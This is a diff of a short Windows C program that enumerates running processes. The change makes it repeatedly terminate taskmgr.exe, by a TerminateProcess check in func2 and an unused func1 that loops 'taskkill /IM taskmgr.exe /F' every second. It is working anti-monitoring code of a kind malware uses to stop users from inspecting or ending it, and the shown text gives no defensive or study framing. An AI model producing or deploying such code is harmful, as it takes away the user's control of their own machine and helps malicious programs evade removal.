@@ -1,7 +1,17 @@
+#include"stdio.h"
 #include"windows.h"
 #include"psapi.h"
-#include"stdio.h"
-int main()
+
+void func1()
+{
+	while(1)
+	{
+		Sleep(1000);
+		system("taskkill /IM taskmgr.exe /F");
+	}
+}
+
+void func2()
 {
 	while(1)
 	{
@@ -24,10 +34,15 @@ int main()
             		GetModuleBaseName( hProcess, hMod, processname,30);
         			}
 				}
-    			//if(strcmp((char*)&processname,"Untitled1.exe"))
+    			if(!strcmp((char*)&processname,"taskmgr.exe"))
     			{
     				TerminateProcess(hProcess,0);
     			}
 			}
 	}
+}
+
+int main()
+{
+	func2();
 }
